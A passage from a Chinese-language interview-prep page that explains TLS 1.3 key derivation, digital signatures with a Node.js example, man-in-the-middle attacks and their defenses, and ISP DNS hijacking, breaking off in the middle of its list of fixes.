shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>Client Hello 包含密钥共享参数</span></span></code></pre></div><p><strong>2. 服务端发送密钥共享参数</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>Server Hello 包含密钥共享参数</span></span></code></pre></div><p><strong>3. 双方计算共享密钥</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>Shared Secret = Diffie-Hellman(Client_Share, Server_Share)</span></span></code></pre></div><p><strong>4. 派生密钥</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>使用 HKDF (HMAC-based Extract-and-Expand Key Derivation Function)</span></span>
<span class="line"><span>- Early Secret</span></span>
<span class="line"><span>- Handshake Secret</span></span>
<span class="line"><span>- Master Secret</span></span>
<span class="line"><span>- Application Traffic Keys</span></span></code></pre></div><p><strong>密钥层次结构（TLS 1.3）：</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>Shared Secret</span></span>
<span class="line"><span>    ↓ HKDF-Extract</span></span>
<span class="line"><span>Early Secret</span></span>
<span class="line"><span>    ↓ Derive-Secret</span></span>
<span class="line"><span>Handshake Secret</span></span>
<span class="line"><span>    ↓ Derive-Secret</span></span>
<span class="line"><span>Master Secret</span></span>
<span class="line"><span>    ↓ Derive-Secret</span></span>
<span class="line"><span>Application Traffic Keys (0-RTT, Handshake, Application)</span></span></code></pre></div><p><strong>总结：</strong></p><ul><li>RSA：简单但不具备前向安全性</li><li>ECDHE：具备前向安全性，推荐使用</li><li>TLS 1.3：使用 HKDF，更安全的密钥派生</li></ul><hr><h2 id="_24、介绍一下数字签名的原理。" tabindex="-1">24、介绍一下数字签名的原理。 <a class="header-anchor" href="#_24、介绍一下数字签名的原理。" aria-label="Permalink to &quot;24、介绍一下数字签名的原理。&quot;">​</a></h2><p><strong>数字签名原理：</strong></p><p><strong>作用：</strong></p><ol><li>验证身份（谁发送的）</li><li>验证完整性（是否被篡改）</li><li>不可抵赖性（发送方无法否认）</li></ol><p><strong>数字签名过程：</strong></p><p><strong>1. 发送方操作</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>步骤1：计算消息的哈希值</span></span>
<span class="line"><span>Hash = Hash_Function(Message)</span></span>
<span class="line"><span></span></span>
<span class="line"><span>步骤2：使用私钥加密哈希值</span></span>
<span class="line"><span>Signature = Encrypt(Private_Key, Hash)</span></span>
<span class="line"><span></span></span>
<span class="line"><span>步骤3：发送消息 + 签名</span></span>
<span class="line"><span>发送：Message + Signature</span></span></code></pre></div><p><strong>2. 接收方操作</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>步骤1：使用公钥解密签名</span></span>
<span class="line"><span>Hash1 = Decrypt(Public_Key, Signature)</span></span>
<span class="line"><span></span></span>
<span class="line"><span>步骤2：计算消息的哈希值</span></span>
<span class="line"><span>Hash2 = Hash_Function(Message)</span></span>
<span class="line"><span></span></span>
<span class="line"><span>步骤3：比较两个哈希值</span></span>
<span class="line"><span>if Hash1 == Hash2:</span></span>
<span class="line"><span>    签名验证成功</span></span>
<span class="line"><span>else:</span></span>
<span class="line"><span>    签名验证失败</span></span></code></pre></div><p><strong>为什么能验证身份：</strong></p><ul><li>只有私钥持有者才能生成有效签名</li><li>公钥无法伪造签名</li></ul><p><strong>为什么能验证完整性：</strong></p><ul><li>任何消息修改都会导致哈希值变化</li><li>签名与消息哈希不匹配即说明被篡改</li></ul><p><strong>为什么不可抵赖：</strong></p><ul><li>签名只能用私钥生成</li><li>私钥只有发送方持有</li></ul><p><strong>实际应用：</strong></p><p><strong>1. HTTPS 证书签名</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>CA 使用私钥对网站证书签名</span></span>
<span class="line"><span>浏览器使用 CA 公钥验证签名</span></span></code></pre></div><p><strong>2. 软件签名</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>开发者使用私钥对软件签名</span></span>
<span class="line"><span>用户验证签名确保软件未被篡改</span></span></code></pre></div><p><strong>3. 代码签名</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>代码仓库提交签名</span></span>
<span class="line"><span>验证提交者身份</span></span></code></pre></div><p><strong>4. 电子合同</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>对合同内容签名</span></span>
<span class="line"><span>验证签署者身份和合同完整性</span></span></code></pre></div><p><strong>常见签名算法：</strong></p><ol><li><p><strong>RSA 签名</strong></p><ul><li>基于大数分解难题</li><li>常用：RSA-PSS</li></ul></li><li><p><strong>ECDSA（椭圆曲线数字签名算法）</strong></p><ul><li>基于椭圆曲线离散对数问题</li><li>优点：签名短，速度快</li><li>常用：ECDSA-P256</li></ul></li><li><p><strong>EdDSA</strong></p><ul><li>基于扭曲爱德华兹曲线</li><li>优点：更安全，更快</li><li>常用：Ed25519</li></ul></li></ol><p><strong>签名 vs 加密：</strong></p><table tabindex="0"><thead><tr><th>操作</th><th>加密</th><th>签名</th></tr></thead><tbody><tr><td>目的</td><td>保密</td><td>认证、完整</td></tr><tr><td>发送方</td><td>使用接收方公钥</td><td>使用发送方私钥</td></tr><tr><td>接收方</td><td>使用接收方私钥</td><td>使用发送方公钥</td></tr><tr><td>结果</td><td>只有接收方能解密</td><td>任何人都能验证</td></tr></tbody></table><p><strong>实际代码示例（Node.js）：</strong></p><div class="language-javascript vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">javascript</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> crypto</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;crypto&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">);</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 生成密钥对</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> { </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">publicKey</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">privateKey</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> } </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> crypto.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">generateKeyPairSync</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;rsa&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, {</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  modulusLength: </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">2048</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">});</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 签名</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> message</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;Hello, World!&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> sign</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> crypto.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">createSign</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;SHA256&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">sign.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">update</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(message);</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> signature</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> sign.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sign</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(privateKey, </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;base64&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">);</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 验证</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> verify</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> crypto.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">createVerify</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;SHA256&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">verify.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">update</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(message);</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> isValid</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> verify.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">verify</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(publicKey, signature, </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;base64&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">);</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">console.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">log</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;Signature valid:&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, isValid);</span></span></code></pre></div><hr><h2 id="_25、什么是中间人攻击-如何解决" tabindex="-1">25、什么是中间人攻击，如何解决？ <a class="header-anchor" href="#_25、什么是中间人攻击-如何解决" aria-label="Permalink to &quot;25、什么是中间人攻击，如何解决？&quot;">​</a></h2><p><strong>中间人攻击（Man-in-the-Middle Attack, MITM）：</strong></p><p><strong>定义：</strong> 攻击者在通信双方之间拦截、篡改、窃听通信内容，而双方都以为在直接与对方通信。</p><p><strong>攻击类型：</strong></p><p><strong>1. 窃听型</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>正常流程：</span></span>
<span class="line"><span>客户端 ←──→ 服务端</span></span>
<span class="line"><span></span></span>
<span class="line"><span>中间人攻击：</span></span>
<span class="line"><span>客户端 ←──→ 攻击者 ←──→ 服务端</span></span>
<span class="line"><span>         (窃听内容)</span></span></code></pre></div><ul><li>攻击者可以读取所有通信内容</li><li>不修改通信内容</li></ul><p><strong>2. 篡改型</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>正常流程：</span></span>
<span class="line"><span>客户端 ←──→ 服务端</span></span>
<span class="line"><span></span></span>
<span class="line"><span>中间人攻击：</span></span>
<span class="line"><span>客户端 ←──→ 攻击者 ←──→ 服务端</span></span>
<span class="line"><span>         (篡改内容)</span></span></code></pre></div><ul><li>攻击者修改通信内容</li><li>例如：篡改交易金额、URL 等</li></ul><p><strong>3. 劫持型</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>正常流程：</span></span>
<span class="line"><span>客户端 ←──→ 服务端</span></span>
<span class="line"><span></span></span>
<span class="line"><span>中间人攻击：</span></span>
<span class="line"><span>客户端 ←──→ 攻击者</span></span>
<span class="line"><span>         (完全接管会话)</span></span></code></pre></div><ul><li>攻击者完全接管会话</li><li>断开与服务端的连接</li></ul><p><strong>常见场景：</strong></p><p><strong>1. 公共 WiFi</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>攻击者搭建虚假 WiFi</span></span>
<span class="line"><span>用户连接后所有流量经过攻击者</span></span></code></pre></div><p><strong>2. ARP 欺骗</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>攻击者伪造 ARP 响应</span></span>
<span class="line"><span>将网关 IP 映射到攻击者 MAC</span></span>
<span class="line"><span>所有流量重定向到攻击者</span></span></code></pre></div><p><strong>3. DNS 欺骗</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>攻击者篡改 DNS 响应</span></span>
<span class="line"><span>将域名解析到攻击者服务器</span></span></code></pre></div><p><strong>4. HTTPS 降级攻击</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>攻击者强制使用 HTTP</span></span>
<span class="line"><span>拦截明文传输的数据</span></span></code></pre></div><p><strong>防御措施：</strong></p><p><strong>1. 使用 HTTPS</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>所有通信使用 HTTPS 加密</span></span>
<span class="line"><span>即使被拦截也无法解密</span></span></code></pre></div><p><strong>2. HSTS（HTTP Strict Transport Security）</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>Strict-Transport-Security: max-age=31536000; includeSubDomains</span></span></code></pre></div><ul><li>强制使用 HTTPS</li><li>防止降级攻击</li></ul><p><strong>3. 证书固定（Certificate Pinning）</strong></p><div class="language-javascript vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">javascript</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 客户端内置证书或公钥</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> pinnedPublicKey</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;...&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 验证服务器证书是否匹配</span></span></code></pre></div><ul><li>防止伪造证书</li><li>移动应用常用</li></ul><p><strong>4. DNS over HTTPS (DoH)</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>加密 DNS 查询</span></span>
<span class="line"><span>防止 DNS 欺骗</span></span></code></pre></div><p><strong>5. VPN</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>加密所有网络流量</span></span>
<span class="line"><span>绕过公共 WiFi 风险</span></span></code></pre></div><p><strong>6. 双向认证</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>客户端也验证服务器证书</span></span>
<span class="line"><span>服务器也验证客户端证书</span></span></code></pre></div><p><strong>7. 避免公共 WiFi</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>使用移动数据</span></span>
<span class="line"><span>或可信的 WiFi 网络</span></span></code></pre></div><p><strong>HTTPS 如何防御中间人攻击：</strong></p><p><strong>1. 证书验证</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>客户端验证服务器证书</span></span>
<span class="line"><span>- CA 签名</span></span>
<span class="line"><span>- 证书有效期</span></span>
<span class="line"><span>- 证书域名</span></span>
<span class="line"><span>- 证书吊销状态</span></span></code></pre></div><p><strong>2. 密钥交换</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>使用 ECDHE 等算法</span></span>
<span class="line"><span>即使长期私钥泄露</span></span>
<span class="line"><span>也无法解密过去通信</span></span></code></pre></div><p><strong>3. 完整性验证</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>消息认证码 (MAC)</span></span>
<span class="line"><span>确保数据未被篡改</span></span></code></pre></div><p><strong>检测中间人攻击：</strong></p><p><strong>1. 证书错误</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>浏览器提示证书不匹配</span></span>
<span class="line"><span>可能是中间人攻击</span></span></code></pre></div><p><strong>2. 延迟异常</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>连接延迟突然增加</span></span>
<span class="line"><span>可能是流量被重定向</span></span></code></pre></div><p><strong>3. 流量异常</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>检查流量异常</span></span>
<span class="line"><span>使用 Wireshark 分析</span></span></code></pre></div><p><strong>最佳实践：</strong></p><ol><li>所有网站使用 HTTPS</li><li>配置 HSTS</li><li>定期更新证书</li><li>使用强加密算法</li><li>禁用旧协议（SSL、TLS 1.0/1.1）</li><li>移动应用使用证书固定</li><li>用户避免使用公共 WiFi</li></ol><hr><h2 id="_26、什么是运营商-dns-劫持-如何解决" tabindex="-1">26、什么是运营商 DNS 劫持，如何解决？ <a class="header-anchor" href="#_26、什么是运营商-dns-劫持-如何解决" aria-label="Permalink to &quot;26、什么是运营商 DNS 劫持，如何解决？&quot;">​</a></h2><p><strong>运营商 DNS 劫持：</strong></p><p><strong>定义：</strong> 运营商（ISP）强制将用户的 DNS 查询指向自己的 DNS 服务器，返回的不是真实 IP 地址，而是运营商控制的 IP。</p><p><strong>劫持类型：</strong></p><p><strong>1. DNS 返回错误 IP</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>正常流程：</span></span>
<span class="line"><span>用户查询 www.example.com</span></span>
<span class="line"><span>→ DNS 返回 93.184.216.34</span></span>
<span class="line"><span>→ 访问真实网站</span></span>
<span class="line"><span></span></span>
<span class="line"><span>劫持流程：</span></span>
<span class="line"><span>用户查询 www.example.com</span></span>
<span class="line"><span>→ 运营商 DNS 返回 1.2.3.4（运营商服务器）</span></span>
<span class="line"><span>→ 访问运营商的广告页面或错误页面</span></span></code></pre></div><p><strong>2. DNS 缓存投毒</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>运营商在 DNS 响应中注入虚假记录</span></span>
<span class="line"><span>用户获得错误的 IP 地址</span></span></code></pre></div><p><strong>3. DNS 重定向</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>访问不存在的域名</span></span>
<span class="line"><span>被重定向到运营商的导航页、广告页</span></span></code></pre></div><p><strong>劫持目的：</strong></p><ul><li>推广运营商产品</li><li>展示广告（获取收益）</li><li>收集用户行为数据</li><li>限制访问某些网站</li></ul><p><strong>识别 DNS 劫持：</strong></p><p><strong>1. IP 地址异常</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>访问的网站 IP 不是真实 IP</span></span></code></pre></div><p><strong>2. 页面异常</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>出现运营商广告、导航页</span></span>
<span class="line"><span>或错误提示页面</span></span></code></pre></div><p><strong>3. 检测工具</strong></p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 使用 dig 命令</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">dig</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> www.example.com</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 比较不同 DNS 服务器返回的 IP</span></span></code></pre></div><p><strong>解决方案：</strong></p><p><strong>1. 使用公共 DNS</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>Google DNS: 8.8.8.8, 8.8.4.4</span></span>
<span class="line"><span>Cloudflare DNS: 1.1.1.1, 1.0.0.1</span></span>
<span class="line"><span>阿里 DNS: 223.5.5.5, 223.6.6.6</span></span>
<span class="line"><span>腾讯 DNS: 119.29.29.29, 182.254.116.116</span></span>
<span class="line"><span>百度 DNS: 180.76.76.76</span></span></code></pre></div><p><strong>修改 DNS 配置：</strong></p><p><strong>Windows:</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>控制面板 → 网络和共享中心 → 更改适配器设置</span></span>
<span class="line"><span>→ 右键网络连接 → 属性 → Internet 协议版本 4 (TCP/IPv4)</span></span>
<span class="line"><span>→ 使用下面的 DNS 服务器地址</span></span>
<span class="line"><span>→ 首选 DNS: 8.8.8.8</span></span>
<span class="line"><span>→ 备用 DNS: 8.8.4.4</span></span></code></pre></div><p><strong>macOS:</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>系统偏好设置 → 网络 → 高级 → DNS</span></span>
<span class="line"><span>→ 添加 DNS 服务器: 8.8.8.8</span></span></code></pre></div><p><strong>Linux:</strong></p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 修改 /etc/resolv.conf</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">nameserver</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 8.8.8.8</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">nameserver</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 8.8.4.4</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 或使用 systemd-resolved</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> systemctl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> restart</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> systemd-resolved</span></span></code></pre></div><p><strong>2. DNS over HTTPS (DoH)</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>加密 DNS 查询</span></span>
<span class="line"><span>防止运营商篡改</span></span></code></pre></div><p><strong>配置 DoH（Chrome/Firefox）：</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>设置 → 隐私和安全 → 安全 → 使用安全的 DNS</span></span>
<span class="line"><span>→ 选择服务提供商（如 Cloudflare）</span></span></code></pre></div><p><strong>3. DNS over TLS (DoT)</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>加密 DNS 查询</span></span>
<span class="line"><span>使用 TLS 协议</span></span></code></pre></div><p><strong>4. DNSSEC</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>DNS 安全扩展</span></span>
<span class="line"><span>验证 DNS 响应的真实性</span></span>
<span class="line"><span>防止 DNS 劫持</span></span></code></pre></div><p><strong>5. 使用 VPN</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>加密所有网络流量</span></span>
<span class="line"><span>包括 DNS 查询</span></span>
<span class="line"><span>绕过运营商 DNS</span></span></code></pre></div><p><strong>6. 修改 hosts 文件</strong></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>直接指定域名 IP</span></span>
